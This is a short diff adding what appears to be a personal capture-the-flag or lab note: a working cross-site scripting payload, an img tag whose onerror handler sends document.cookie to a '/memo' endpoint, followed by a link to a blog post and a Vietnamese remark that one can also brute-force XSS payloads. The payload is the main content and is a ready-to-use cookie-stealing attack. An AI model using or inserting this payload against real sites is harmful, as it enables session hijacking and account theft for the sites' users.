@@ -1,0 +1,7 @@
+<img src="xss" onerror="location.href='/memo?memo='+document.cookie">
+
+
+https://pd6156.tistory.com/219
+
+
+cái hình mình tham khảo thôi, hoặc lên paayload xss mà brute.... đầy
